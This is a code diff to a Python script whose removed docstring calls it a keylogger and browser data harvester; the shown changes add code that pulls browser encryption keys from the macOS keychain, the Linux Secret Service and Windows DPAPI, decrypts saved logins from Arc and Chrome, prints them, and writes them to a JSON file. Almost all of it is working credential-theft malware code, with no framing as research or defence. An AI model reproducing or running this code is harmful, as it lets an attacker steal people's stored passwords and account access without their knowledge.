@@ -11,6 +11,7 @@ import binascii
 import json
 import os
 import platform
+import hashlib
 import re
 import shutil
 import socket
@@ -24,6 +25,9 @@ import datetime
 
 from importlib import import_module
 from pathlib import Path
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from Crypto.Cipher import AES
 
 # Third-party imports
 try:
@@ -32,6 +36,7 @@ try:
     from Crypto.Cipher import AES
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
     from cryptography.fernet import Fernet
+    import keyring
 except ImportError:
     print("Required packages not installed. Trying to install...")
     print("pip install pillow pynput pycryptodomex cryptography")
@@ -324,14 +329,23 @@ class ChromeBrowser(BrowserBase):
         if not secret_pass_key:
             secret_pass_key = b'peanuts'
         
-        # Chrome uses these values for key derivation
-        iterations = 1003
-        salt = b'saltysalt'
-        length = 16
-
-        # Derive the actual key
-        kdf = import_module('Crypto.Protocol.KDF')
-        self.key = kdf.PBKDF2(secret_pass_key, salt, length, iterations)
+        # Print debug info
+        print(f"Keychain password found (starting bytes): {secret_pass_key[:4] if len(secret_pass_key) > 4 else secret_pass_key}...")
+        
+        # Chrome parameters for macOS
+        key = hashlib.pbkdf2_hmac(
+            'sha1', 
+            secret_pass_key, 
+            b'saltysalt', 
+            iterations=1003, 
+            dklen=16
+        )
+        
+        # Print derived key for debugging
+        print(f"Derived key (hex): {key.hex()}")
+        
+        # Set the key for use in decryption
+        self.key = key
         
         # Adjust Chrome paths for macOS
         user_home = os.path.expanduser("~")
@@ -440,21 +454,8 @@ class ChromeBrowser(BrowserBase):
         if not encrypted_data:
             return ""
             
+        # Fallback
         try:
-            # Handle different encryption formats
-            if len(encrypted_data) > 3 and encrypted_data[:3] in (b'v10', b'v11'):
-                # Chrome v80+ uses AES-GCM
-                nonce = encrypted_data[3:15]
-                ciphertext = encrypted_data[15:]
-                
-                try:
-                    aesgcm = AESGCM(self.key)
-                    decrypted = aesgcm.decrypt(nonce, ciphertext, None)
-                    return decrypted.decode('utf-8', errors='replace')
-                except Exception as e:
-                    print(f"AES-GCM decryption failed: {e}")
-            
-            # Fallback
             aes = import_module('Crypto.Cipher.AES')
             i_vector = b' ' * 16
 
@@ -509,15 +510,53 @@ class ChromeBrowser(BrowserBase):
             if len(encrypted_data) > 3 and encrypted_data[:3] in (b'v10', b'v11'):
                 # Chrome v80+ uses AES-GCM
                 nonce = encrypted_data[3:15]
-                ciphertext = encrypted_data[15:]
+                # In Chrome/Arc AES-GCM format, tag is appended to ciphertext
+                ciphertext_with_tag = encrypted_data[15:]
                 
+                # Use AES-GCM mode
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                 try:
                     aesgcm = AESGCM(self.key)
-                    decrypted = aesgcm.decrypt(nonce, ciphertext, None)
-
-                    return decrypted.decode('utf-8', errors='replace')
+                    decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
+                    # Filter out non-printable characters
+                    clean_bytes = bytes(b for b in decrypted if 32 <= b <= 126 or b in (9, 10, 13))
+                    cleaned_str = clean_bytes.decode('utf-8', errors='replace')
+                    # Remove trailing nulls and spaces
+                    cleaned_str = cleaned_str.rstrip('\0 \t\r\n')
+                    return cleaned_str
                 except Exception as e:
-                    print(f"AES-GCM decryption failed: {e}")
+                    print(f"AES-GCM decryption failed (detailed): {e}")
+                    # Try alternative approach
+                    try:
+                        # Debug info
+                        print(f"Encrypted data length: {len(encrypted_data)}")
+                        print(f"Nonce length: {len(nonce)}")
+                        
+                        # Try with cryptography's Cipher instead of AESGCM
+                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                        from cryptography.hazmat.backends import default_backend
+                        
+                        cipher = Cipher(
+                            algorithms.AES(self.key),
+                            modes.GCM(nonce),
+                            backend=default_backend()
+                        )
+                        decryptor = cipher.decryptor()
+                        
+                        # Split ciphertext and tag (tag is the last 16 bytes)
+                        ciphertext = ciphertext_with_tag[:-16]
+                        tag = ciphertext_with_tag[-16:]
+                        
+                        # Decrypt and verify
+                        decrypted = decryptor.update(ciphertext) + decryptor.finalize_with_tag(tag)
+                        # Filter out non-printable characters
+                        clean_bytes = bytes(b for b in decrypted if 32 <= b <= 126 or b in (9, 10, 13))
+                        cleaned_str = clean_bytes.decode('utf-8', errors='replace')
+                        # Remove trailing nulls and spaces
+                        cleaned_str = cleaned_str.rstrip('\0 \t\r\n')
+                        return cleaned_str
+                    except Exception as e2:
+                        print(f"Alternative decryption also failed: {e2}")
             
             # Fallback
             aes = import_module('Crypto.Cipher.AES')
@@ -1077,40 +1116,443 @@ class ArcBrowser(BrowserBase):
         self.history = {'data': []}
         self.bookmarks = {'data': []}
         self.downloads = {'data': []}
-        self.cookies = {'data': []}        
+        self.cookies = {'data': []}
     
     def get_browser_paths(self):
         """
         Get the paths to the browser databases.
         """
-
         browser_paths = []
         
         if self.system == "Windows":
             local_appdata = os.getenv('LOCALAPPDATA')
             browser_paths = [
-                (os.path.join(local_appdata, "Arc", "User Data", "Default", "Local Storage", "leveldb"), 'arc'),
+                (os.path.join(local_appdata, "Arc", "User Data", "Default"), 'arc'),
             ]
 
         elif self.system == "Darwin":  # macOS
             home = os.path.expanduser('~')
             browser_paths = [
-                (os.path.join(home, 'Library', 'Application Support', 'Arc', "User Data", "Default", "Local Storage", "leveldb"), 'arc'),
+                (os.path.join(home, 'Library', 'Application Support', 'Arc', "User Data", "Default"), 'arc'),
             ]
 
         elif self.system == "Linux":
             home = os.path.expanduser('~')
             browser_paths = [
-                os.path.join(home, ".config", "Arc", "Local Storage", "leveldb"),
+                (os.path.join(home, ".config", "Arc", "Local Storage"), 'arc'),
             ]
             
         # Filter to only existing paths
         return [(path, name) for path, name in browser_paths if os.path.exists(path)]
 
+    def get_encryption_key(self, browser_path):
+        """
+        Get the encryption key for browser password decryption.
         
+        Args:
+            browser_path (str): Path to browser profile directory
             
+        Returns:
+            bytes: The decryption key, or None if retrieval fails
+        """
+        system = self.system
         
+        # Platform-specific key retrieval
+        if system == "Darwin":       # macOS
+            return self._get_encryption_key_mac()
+        elif system == "Windows":    # Windows
+            return self._get_encryption_key_windows(browser_path)
+        elif system == "Linux":      # Linux
+            return self._get_encryption_key_linux()
         
+        return None
+        
+    def _get_encryption_key_mac(self):
+        """Get the encryption key from macOS keychain"""
+        try:
+            # Chrome-based browsers store the key in keychain
+            keychain_candidates = [
+                # Format: (account, service)
+                ('Arc', 'Arc Safe Storage'),
+                ('Chrome', 'Chrome Safe Storage')
+            ]
+            
+            # Try each possible keychain entry
+            for account, service in keychain_candidates:
+                cmd = ['security', 'find-generic-password', '-w', '-a', account, '-s', service]
+                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                stdout, _ = process.communicate()
+                
+                if process.returncode == 0:
+                    # Derive the AES key using PBKDF2
+                    password = stdout.strip()
+                    if isinstance(password, str):
+                        password = password.encode('utf-8')
+                    
+                    return hashlib.pbkdf2_hmac(
+                        'sha1', 
+                        password, 
+                        b'saltysalt',  # Fixed salt used by Chrome
+                        iterations=1003,  # Iteration count used by Chrome
+                        dklen=16  # 128-bit AES key
+                    )
+            
+            return None
+        except Exception:
+            return None
+            
+    def _get_encryption_key_windows(self, browser_path):
+        """Get the encryption key on Windows"""
+        try:
+            # Get browser paths if not provided
+            if not browser_path:
+                browser_paths = self.get_browser_paths()
+                if not browser_paths:
+                    return None
+                browser_path = browser_paths[0][0]
+                
+            # Find the Local State file with the encrypted key
+            local_state_path = self._find_local_state_file(browser_path)
+            if not local_state_path:
+                return None
+            
+            # Load and parse the Local State file
+            local_state = self._load_json_file(local_state_path)
+            if not local_state:
+                return None
+            
+            # Extract and decrypt the key
+            if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
+                return None
+                
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            
+            # Remove DPAPI prefix if present
+            if not encrypted_key.startswith(b'DPAPI'):
+                return None
+                
+            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+            
+            # Use Windows DPAPI to decrypt the key
+            import win32crypt
+            try:
+                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            except Exception:
+                return None
+                
+        except Exception:
+            return None
+            
+    def _find_local_state_file(self, browser_path):
+        """Find the Local State file containing the encryption key"""
+        potential_paths = [
+            os.path.join(browser_path, "..", "Local State"),  # Up one level
+            os.path.join(browser_path, "Local State"),        # In the profile
+            os.path.join(os.path.dirname(os.path.dirname(browser_path)), "Local State")  # Two levels up
+        ]
+        
+        for path in potential_paths:
+            if os.path.exists(path):
+                return path
+                
+        return None
+        
+    def _load_json_file(self, file_path):
+        """Load and parse a JSON file with encoding fallbacks"""
+        try:
+            # Try UTF-8 first
+            with open(file_path, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except UnicodeDecodeError:
+            # Try binary mode with Latin-1 if UTF-8 fails
+            try:
+                with open(file_path, 'rb') as f:
+                    return json.loads(f.read().decode('latin-1', errors='replace'))
+            except Exception:
+                return None
+        except Exception:
+            return None
+            
+    def _get_encryption_key_linux(self):
+        """Get the encryption key on Linux"""
+        try:
+            # Try to use secretstorage if available
+            try:
+                import secretstorage
+                
+                # Connect to the Secret Service
+                connection = secretstorage.dbus_init()
+                collection = secretstorage.get_default_collection(connection)
+                
+                # Try different possible key names
+                service_names = [
+                    "Arc Safe Storage", 
+                    "Arc", 
+                    "Thorium Safe Storage", 
+                    "Chrome Safe Storage", 
+                    "Chromium Safe Storage"
+                ]
+                
+                for service in service_names:
+                    for item in collection.search_items({"application": service}):
+                        secret = item.get_secret()
+                        return hashlib.pbkdf2_hmac(
+                            'sha1', 
+                            secret, 
+                            b'saltysalt',  # Fixed salt
+                            iterations=1,  # Linux uses 1 iteration
+                            dklen=16  # 128-bit AES key
+                        )
+            except ImportError:
+                pass  # secretstorage not available
+            
+            # Fallback to default key
+            return hashlib.pbkdf2_hmac(
+                'sha1', 
+                b'peanuts',  # Default password when no keyring available
+                b'saltysalt', 
+                iterations=1, 
+                dklen=16
+            )
+                
+        except Exception:
+            return None
+
+    def decrypt_password(self, encrypted_password, key):
+        """
+        Decrypt browser password data using the provided encryption key.
+        
+        Args:
+            encrypted_password (bytes): The encrypted password data
+            key (bytes): The decryption key
+            
+        Returns:
+            str: The decrypted password as a string, or None if decryption fails
+        """
+        # Guard clause - return early if we don't have valid input
+        if not encrypted_password or not key:
+            return None
+            
+        try:
+            # Choose decryption method based on operating system
+            if platform.system() == "Darwin":  # macOS
+                return self._decrypt_password_macos(encrypted_password, key)
+            elif platform.system() == "Windows":
+                return self._decrypt_password_windows(encrypted_password, key)
+            elif platform.system() == "Linux":
+                return self._decrypt_password_linux(encrypted_password, key)
+            
+            return None
+            
+        except Exception:
+            return None
+            
+    def _decrypt_password_macos(self, encrypted_password, key):
+        """Handle macOS-specific password decryption"""
+        if not encrypted_password:
+            return ""
+            
+        # Try modern AES-GCM method (Chrome v80+)
+        if len(encrypted_password) > 3 and encrypted_password[:3] in (b'v10', b'v11'):
+            try:
+                # Extract nonce and ciphertext
+                nonce = encrypted_password[3:15]
+                ciphertext_with_tag = encrypted_password[15:]
+                
+                # Decrypt using AES-GCM
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                aesgcm = AESGCM(key)
+                decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
+                return self._clean_decrypted_password(decrypted)
+            except Exception:
+                pass  # Fall through to legacy method
+        
+        # Try legacy AES-CBC method
+        try:
+            from Crypto.Cipher import AES
+            iv = b' ' * 16  # Standard IV for Chrome
+            
+            # Remove version prefix if present
+            enc_passwd = encrypted_password[3:] if len(encrypted_password) > 3 else encrypted_password
+            cipher = AES.new(key, AES.MODE_CBC, IV=iv)
+            decrypted = cipher.decrypt(enc_passwd)
+            return self._clean_decrypted_password(decrypted)
+        except Exception:
+            return ""
+    
+    def _decrypt_password_windows(self, encrypted_password, key):
+        """Handle Windows-specific password decryption"""
+        try:
+            # Modern Chrome/Arc browsers use AES-GCM (v10/v11 format)
+            if len(encrypted_password) > 3 and encrypted_password[:3] in (b'v10', b'v11'):
+                # Extract components
+                nonce = encrypted_password[3:15]
+                ciphertext_with_tag = encrypted_password[15:]
+                
+                try:
+                    # Try high-level AESGCM API first
+                    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                    aesgcm = AESGCM(key)
+                    decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
+                except Exception:
+                    # Fall back to manual GCM implementation
+                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                    from cryptography.hazmat.backends import default_backend
+                    
+                    # Ensure we have enough data for tag
+                    if len(ciphertext_with_tag) < 16:
+                        return None
+                        
+                    # Split ciphertext and authentication tag
+                    tag = ciphertext_with_tag[-16:]
+                    ciphertext = ciphertext_with_tag[:-16]
+                    
+                    # Decrypt with explicit GCM parameters
+                    cipher = Cipher(
+                        algorithms.AES(key),
+                        modes.GCM(nonce, tag),
+                        backend=default_backend()
+                    )
+                    decryptor = cipher.decryptor()
+                    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+            
+            # Older Chrome/Arc versions use Windows DPAPI directly
+            else:
+                import win32crypt
+                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+            
+            return self._clean_decrypted_password(decrypted)
+            
+        except Exception:
+            # Last resort: try to decode as-is
+            try:
+                return encrypted_password.decode('utf-8', errors='replace')
+            except:
+                return None
+    
+    def _decrypt_password_linux(self, encrypted_password, key):
+        """Handle Linux-specific password decryption"""
+        # Try modern AES-GCM method first
+        if len(encrypted_password) > 3 and encrypted_password[:3] in (b'v10', b'v11'):
+            try:
+                # Extract components
+                nonce = encrypted_password[3:15]
+                ciphertext_with_tag = encrypted_password[15:]
+                
+                # Decrypt using AES-GCM
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                aesgcm = AESGCM(key)
+                decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
+                return self._clean_decrypted_password(decrypted)
+            except Exception:
+                pass  # Fall through to legacy method
+        
+        # Try legacy AES-CBC method
+        try:
+            from Crypto.Cipher import AES
+            iv = b' ' * 16
+            
+            # Remove version prefix if present
+            enc_passwd = encrypted_password[3:] if len(encrypted_password) > 3 else encrypted_password
+            cipher = AES.new(key, AES.MODE_CBC, IV=iv)
+            decrypted = cipher.decrypt(enc_passwd)
+            return self._clean_decrypted_password(decrypted)
+        except Exception:
+            return None
+    
+    def _clean_decrypted_password(self, decrypted_bytes):
+        """
+        Clean and format decrypted password bytes into a usable string
+        
+        Args:
+            decrypted_bytes (bytes): Raw decrypted password data
+            
+        Returns:
+            str: Cleaned password string
+        """
+        # Filter out non-printable characters
+        clean_bytes = bytes(b for b in decrypted_bytes if 32 <= b <= 126 or b in (9, 10, 13))
+        
+        # Convert to string, handling invalid UTF-8
+        cleaned_str = clean_bytes.decode('utf-8', errors='replace')
+        
+        # Remove trailing nulls and whitespace
+        cleaned_str = cleaned_str.rstrip('\0 \t\r\n')
+        
+        return cleaned_str
+
+    def get_credentials(self):
+        """
+        Get stored credentials from the Arc browser.
+        Returns a list of dictionaries with keys 'url', 'username', 'password'.
+        """
+        try:
+            db_path = self.get_browser_paths()[0][0] + "/Login Data"
+    
+            if not os.path.exists(db_path):
+                print(f"Login Data file not found at: {db_path}")
+                return []
+    
+            temp_db_path = self._copy_db_file(db_path)
+            if not temp_db_path:
+                print("Failed to create temporary copy of Login Data file")
+                return []
+    
+            conn = sqlite3.connect(temp_db_path)
+            cursor = conn.cursor()
+    
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            results = cursor.fetchall()
+    
+            decryption_key = self.get_encryption_key(db_path)
+            credentials = []
+            
+            for row in results:
+                origin_url, username, encrypted_password = row
+                
+                # Try to decrypt the password
+                decrypted_password = self.decrypt_password(encrypted_password, decryption_key)
+                
+                # Only add credentials with valid data
+                if username or decrypted_password:
+                    credential = {
+                        'url': origin_url,
+                        'username': username,
+                        'password': decrypted_password if decrypted_password else 'Failed to decrypt'
+                    }
+                    credentials.append(credential)
+                    
+                    print(f"URL: {origin_url}")
+                    print(f"Username: {username}")
+                    print(f"Password: {decrypted_password}")
+            
+            # Clean up temporary database
+            if os.path.exists(temp_db_path):
+                os.remove(temp_db_path)
+                
+            return credentials
+        except Exception as e:
+            print(f"Error extracting credentials: {e}")
+            return []
+            
+    def harvest_data(self):
+        """
+        Harvest all available data from Arc browser.
+        
+        Returns:
+            dict: Dictionary containing all the extracted data in the expected format
+        """
+        credentials = self.get_credentials()
+        
+        # Format the data to match the expected JSON structure
+        return {
+            'passwords': credentials,
+            'history': {'data': []},  # Add empty placeholder for now
+            'bookmarks': {'data': []},
+            'downloads': {'data': []},
+            'cookies': {'data': []},
+            'count': len(credentials)
+        }
 
 
 class BrowserDataHarvester:
@@ -1136,7 +1578,7 @@ class BrowserDataHarvester:
         
         # Initialize browser extractors
         try:
-            self.browser_instances['chrome'] = ChromeBrowser()
+            # self.browser_instances['chrome'] = ChromeBrowser()
             self.browser_instances['arc'] = ArcBrowser()
             # self.browser_instances['firefox'] = FirefoxBrowser()
             # self.browser_instances['edge'] = EdgeBrowser()
@@ -1198,29 +1640,106 @@ class BrowserDataHarvester:
 
 
 def main():
-    """Main function to run the keylogger and browser data harvester"""
-    # Extract browser data
-    browser_harvester = BrowserDataHarvester()
-    browser_data = browser_harvester.harvest_browser_data()
+    """
+    Main function to extract and save browser credentials.
     
-    # Save the results to files
-    with open('browser_passwords.json', 'w') as f:
-        json.dump(browser_data['passwords'], f, indent=4)
-
-    with open('browser_history.json', 'w') as f:
-        json.dump(browser_data['history'], f, indent=4)
+    Extracts passwords and other data from supported browsers,
+    saves the results to a JSON file, and displays a summary.
+    """
+    results = {}
     
-    with open('browser_bookmarks.json', 'w') as f:
-        json.dump(browser_data['bookmarks'], f, indent=4)
+    # Create an array of supported browsers to extract from
+    browsers_to_extract = [
+        {"name": "arc", "class": ArcBrowser, "description": "Arc browser"},
+        {"name": "chrome", "class": ChromeBrowser, "description": "Chrome browser"}
+    ]
     
-    with open('browser_downloads.json', 'w') as f:
-        json.dump(browser_data['downloads'], f, indent=4)
-
-    with open('browser_cookies.json', 'w') as f:
-        json.dump(browser_data['cookies'], f, indent=4)
+    print("\nStarting browser data extraction...")
     
-    # Clean up
-    browser_harvester.cleanup()
+    # Extract data from each supported browser
+    for browser in browsers_to_extract:
+        name = browser["name"]
+        browser_class = browser["class"]
+        description = browser["description"]
+        
+        try:
+            print(f"\nExtracting {description} data...")
+            browser_instance = browser_class()
+            browser_data = browser_instance.harvest_data()
+            
+            # Determine success based on password count
+            password_count = len(browser_data.get('passwords', [])) 
+            if 'data' in browser_data.get('passwords', {}):
+                password_count = len(browser_data['passwords']['data'])
+                
+            if password_count > 0:
+                print(f"Successfully recovered {password_count} passwords from {description}!")
+            else:
+                print(f"No passwords found in {description}.")
+                
+            # Store results
+            browser_data['count'] = password_count
+            results[name] = browser_data
+            
+            # Clean up
+            browser_instance.cleanup()
+            
+        except Exception as e:
+            print(f"Error extracting {description} data: {e}")
+            results[name] = {
+                "error": str(e),
+                "passwords": [] if name == "arc" else {"data": []},
+                "history": {"data": []},
+                "bookmarks": {"data": []},
+                "downloads": {"data": []},
+                "cookies": {"data": []},
+                "count": 0
+            }
+    
+    # Save results to JSON file
+    try:
+        output_file = "browser_data.json"
+        with open(output_file, "w") as f:
+            json.dump(results, f, indent=2)
+        print(f"\nSaved browser data to {output_file}")
+    except Exception as e:
+        print(f"Error saving results to JSON: {e}")
+    
+    # Print summary report
+    print("\n======= Browser Password Recovery Results =======")
+    for browser_name, data in results.items():
+        if "error" in data:
+            print(f"\n{browser_name.capitalize()}: Error - {data['error']}")
+        else:
+            password_count = data.get("count", 0)
+            print(f"\n{browser_name.capitalize()}: Recovered {password_count} passwords")
+            
+            # Show sample credentials if found
+            if password_count > 0:
+                print("\nSample credentials:")
+                print("=" * 50)
+                
+                # Handle different data formats between browsers
+                if browser_name == "arc":
+                    # Arc has a direct password list
+                    for i, entry in enumerate(data["passwords"][:3]):  # Show max 3 samples
+                        print(f"URL      : {entry['url']}")
+                        print(f"Username : {entry['username']}")
+                        print(f"Password : {entry['password']}")
+                        print("-" * 50)
+                        if i >= 2:  # Only show 3 samples
+                            break
+                else:
+                    # Chrome and others use 'data' subdictionary
+                    for i, entry in enumerate(data["passwords"]["data"][:3]):  # Show max 3 samples
+                        print(f"URL      : {entry['url']}")
+                        print(f"Username : {entry['username']}")
+                        print(f"Password : {entry['password']}")
+                        print("-" * 50)
+                        if i >= 2:  # Only show 3 samples
+                            break
+    
+    print(f"\nFull details saved to {output_file}")
 
 
 if __name__ == "__main__":
